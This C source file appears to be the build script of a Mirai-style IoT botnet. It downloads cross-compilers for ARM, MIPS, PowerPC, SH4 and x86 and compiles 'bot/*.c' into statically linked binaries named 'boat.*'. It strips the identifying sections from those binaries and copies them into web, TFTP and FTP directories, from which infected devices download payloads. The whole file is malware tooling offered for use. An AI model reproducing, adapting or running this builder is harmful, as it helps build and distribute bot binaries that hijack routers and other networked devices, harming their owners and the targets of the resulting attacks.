#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <errno.h>

#define BOT_LOCATION "bot/*.c"

struct cross_compiler_t
{
    char output[64];
    char tag[64];
    char filename[64];
    char url[128];
    char flags[64];
};

struct cross_compiler_t **compilas = {NULL};
int compilas_len = 0;

void add_compila(char *output, char *tag, char *filename, char *url, char *flags)
{
    compilas = realloc(compilas, (compilas_len+1)*sizeof(struct cross_compiler_t *));
    compilas[compilas_len] = malloc(sizeof(struct cross_compiler_t));
    struct cross_compiler_t *cc = compilas[compilas_len];
    compilas_len++;
    strcpy(cc->output, output);
    strcpy(cc->tag, tag);
    strcpy(cc->filename, filename);
    strcpy(cc->url, url);
    strcpy(cc->flags, flags);
    return;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}

int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

void run_cmd(char *message, int show_output)
{
    char buf[4096];
    memset(buf, 0, 4096);
    sprintf(buf, "%s 2>&1", message);
    int command = fdpopen(buf, "r");
    memset(buf, 0, 4096);
    while(fdgets(buf, 4096, command) != 0)
    {
            if(show_output == 1)
            {
                printf("%s", buf);
            }
            memset(buf, 0, 4096);
    }
    fdpclose(command);
    return;
}

uint8_t util_parse_ipv4(uint8_t *out, char *buffer)
{
    int ret_count = 0;
    char token[512];
    int token_pos = 0;
    int pos;
    memset(token, 0, 512);
    for(pos = 0; pos < strlen(buffer); pos++)
    {
        if(buffer[pos] == '.')
        {
            int tmp = atoi(token);
            if(tmp < 0 || tmp > 255) return 0;
            out[ret_count] = atoi(token);
            ret_count++;
            memset(token, 0, 512);
            token_pos = 0;
        }
        else
        {
            token[token_pos] = buffer[pos];
            token_pos++;
        }
    }

    if(token_pos > 0)
    {
        int tmp = atoi(token);
        if(tmp < 0 || tmp > 255) return 0;
        out[ret_count] = atoi(token);
        ret_count++;
        memset(token, 0, 512);
        token_pos = 0;
    }

    #ifdef DEBUG
    printf("got %d tokens, (%d.%d.%d.%d)\r\n", ret_count, out[0], out[1], out[2], out[3]);
    #endif

    if(ret_count == 4)
    {
        return 1;
    }
    return 0;
}

int main()
{
    add_compila("arm", "armv4l", "cross-compiler-armv4l", "https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv4l.tar.bz2\0", "");
    add_compila("arm5", "armv5l", "cross-compiler-armv5l", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv5l.tar.gz\0", "");
    add_compila("arm6", "armv6l", "cross-compiler-armv6l", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv6l.tar.gz\0", "");
    add_compila("arm7", "armv7l", "cross-compiler-armv7l", "https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2\0", "");
    add_compila("x86", "i586", "cross-compiler-i586", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-i586.tar.gz\0", "");
    add_compila("x86_64", "x86_64", "cross-compiler-x86_64", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-x86_64.tar.gz\0", "");
    add_compila("mips", "mips", "cross-compiler-mips", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-mips.tar.gz\0", "");
    add_compila("mpsl", "mipsel", "cross-compiler-mipsel", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-mipsel.tar.gz\0", "");
    add_compila("ppc", "powerpc", "cross-compiler-powerpc", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-powerpc.tar.gz\0", "");
    add_compila("sh4", "sh4", "cross-compiler-sh4", "https://landley.net/aboriginal/downloads/binaries/cross-compiler-sh4.tar.gz\0", "");
    
    char buffer[4096];

    struct stat sb;
    if (stat("/etc/xcompile", &sb) == 0 && S_ISDIR(sb.st_mode)) {
        printf("Found cross compiler folder at location /etc/xcompile\r\n");
    } else {
        printf("Creating folder /etc/xcompile\r\n");
        run_cmd("mkdir /etc/xcompile", 1);
    }

    int j;
    for(j = 0; j < compilas_len; j++)
    {
        char folder[512];
        sprintf(folder, "/etc/xcompile/%s", compilas[j]->filename);
        if (stat(folder, &sb) == 0 && S_ISDIR(sb.st_mode)) {
            printf("Found cross compiler at location %s\r\n", folder);
            continue;
        } else {
            memset(buffer, 0, 1024);
            sprintf(buffer, "cd /etc/xcompile; wget %s --no-check-certificate; tar -xvf %s.tar.*", compilas[j]->url, compilas[j]->filename);
            run_cmd(buffer, 1);
            memset(buffer, 0, 1024);
            printf("Downloaded cross compiler at location %s\r\n", folder);
            continue;
        }
    }

    memset(buffer, 0, 1024);

    if (stat("./release", &sb) == 0 && S_ISDIR(sb.st_mode)) {
        printf("Found old build! deleting and continue with compilation\r\n");
        run_cmd("rm -rf release; mkdir release", 1);
    } else {
        printf("Creating folder ./release\r\n");
        run_cmd("mkdir release", 1);
    }
	
	char server_addr_flags[128];
	memset(server_addr_flags, 0, 128);
	
    for(j = 0; j < compilas_len; j++)
    {
        printf("Compiling for %s\r\n", compilas[j]->tag);
        memset(buffer, 0, 4096);
        if(j == 6)
        {
            sprintf(buffer, "/etc/xcompile/%s/bin/%s-gcc -std=c99 -O3 -Os -s -fvisibility=hidden -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -static %s -DBUILD_NUM=%d -o release/%s.%s " BOT_LOCATION, compilas[j]->filename, compilas[j]->tag, server_addr_flags, j, "boat", compilas[j]->output);
        }
        else
        {
            sprintf(buffer, "/etc/xcompile/%s/bin/%s-gcc -std=c99 -O3 -Os -s -fvisibility=hidden -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -static %s -DBUILD_NUM=%d -o release/%s.%s " BOT_LOCATION, compilas[j]->filename, compilas[j]->tag, server_addr_flags, j, "boat", compilas[j]->output);
        }
        
        run_cmd(buffer, 1);
        memset(buffer, 0, 4096);
        sprintf(buffer, "/etc/xcompile/%s/bin/%s-strip release/%s.%s -S --strip-unneeded --strip-all --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr", compilas[j]->filename, compilas[j]->tag, "boat", compilas[j]->output);
        run_cmd(buffer, 1);
    }

     if (stat("/var/www/", &sb) == 0 && S_ISDIR(sb.st_mode)) {
        printf("Found /var/www/ and checking for /var/www/html\r\n");
    } else {
        printf("Creating folder /var/www/\r\n");
        run_cmd("mkdir /var/www/", 1);
    }
    if (stat("/var/www/html", &sb) == 0 && S_ISDIR(sb.st_mode)) {
        printf("Found /var/www/html and moving binarys\r\n");
        run_cmd("rm -rf /var/www/html/boat.*", 1);
    } else {
        printf("Creating folder /var/www/html and moving binarys\r\n");
        run_cmd("mkdir /var/www/html", 1);
    }
    run_cmd("cp release/boat.* /var/www/html/", 1);

    if (stat("/var/lib/tftpboot", &sb) == 0 && S_ISDIR(sb.st_mode)) 
    {
        printf("Found /var/lib/tftpboot and moving binarys\r\n");
        run_cmd("rm -rf /var/lib/tftpboot/boat.*", 1);
    }
    else
    {
        printf("Creating folder /srv/tftp and moving binarys\r\n");
        run_cmd("mkdir /var/lib/tftpboot/", 1);
    }
    run_cmd("cp release/boat.* /var/lib/tftpboot/", 1);

    if (stat("/srv/tftp", &sb) == 0 && S_ISDIR(sb.st_mode)) 
    {
        printf("Found /srv/tftp and moving binarys\r\n");
        run_cmd("rm -rf /srv/tftp/boat.*", 1);
    } 
    else 
    {
        printf("Creating folder /srv/tftp and moving binarys\r\n");
        run_cmd("mkdir /srv/tftp/", 1);
    }
    run_cmd("cp release/boat.* /srv/tftp/", 1);

    if (stat("/var/ftp", &sb) == 0 && S_ISDIR(sb.st_mode)) 
    {
        printf("Found /var/ftp and moving binarys\r\n");
        run_cmd("rm -rf /var/ftp/boat.*", 1);
    } 
    else 
    {
        printf("Creating folder /var/ftp and moving binarys\r\n");
        run_cmd("mkdir /var/ftp/", 1);
    }
    run_cmd("cp release/boat.* /var/ftp", 1);

    return 0;
}
